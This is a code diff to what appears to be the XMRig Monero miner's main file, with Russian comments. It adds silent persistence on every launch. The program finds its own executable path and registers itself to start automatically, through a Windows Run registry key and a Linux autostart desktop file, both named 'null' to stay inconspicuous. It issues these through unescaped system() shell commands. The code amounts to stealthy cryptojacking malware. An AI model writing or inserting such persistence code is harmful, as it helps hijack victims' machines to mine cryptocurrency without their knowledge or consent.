@@ -19,33 +19,64 @@
 #include "App.h"
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
+#include "base/crypto/String.h" // Для xmrig::String
+#include <iostream>
+#include <cstdlib>
 
 #ifdef _WIN32
-void addToStartupWindows() {
-    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyProgram /t REG_SZ /d \"C:\\\\path\\\\to\\\\program.exe\" /f");
+#include <windows.h>
+#endif
+
+xmrig::String getExecutablePath() {
+#ifdef _WIN32
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    return xmrig::String(path);
+#else
+    char path[4096];
+    ssize_t count = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    if (count != -1) {
+        path[count] = '\0';
+        return xmrig::String(path);
+    }
+    return xmrig::String();
+#endif
+}
+
+#ifdef _WIN32
+void addToStartupWindows(const xmrig::String &path) {
+    xmrig::String command = xmrig::String("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v null /t REG_SZ /d \"") + path + "\" /f";
+    system(command.c_str());
 }
 #else
-void addToStartupLinux() {
-    system("echo '[Desktop Entry]\n"
-           "Type=Application\n"
-           "Exec=/path/to/your/program\n"
-           "Hidden=false\n"
-           "NoDisplay=false\n"
-           "X-GNOME-Autostart-enabled=true\n"
-           "Name=MyProgram' > ~/.config/autostart/my_program.desktop");
+void addToStartupLinux(const xmrig::String &path) {
+    xmrig::String command = xmrig::String("echo '[Desktop Entry]\n"
+                                          "Type=Application\n"
+                                          "Exec=") + path + "\n"
+                                          "Hidden=false\n"
+                                          "NoDisplay=false\n"
+                                          "X-GNOME-Autostart-enabled=true\n"
+                                          "Name=null' > ~/.config/autostart/null.desktop";
+    system(command.c_str());
 }
 #endif
 
 int main(int argc, char **argv)
 {
     try {
-        #ifdef _WIN32
-            addToStartupWindows();
-        #else
-            addToStartupLinux();
-        #endif
-    } catch (...) {
+        xmrig::String exePath = getExecutablePath();
+        if (exePath.isEmpty()) {
+            std::cerr << "Failed to determine executable path!" << std::endl;
+            return 1;
+        }
 
+#ifdef _WIN32
+        addToStartupWindows(exePath);
+#else
+        addToStartupLinux(exePath);
+#endif
+    } catch (...) {
+        std::cerr << "An error occurred during startup configuration." << std::endl;
     }
 
     using namespace xmrig;
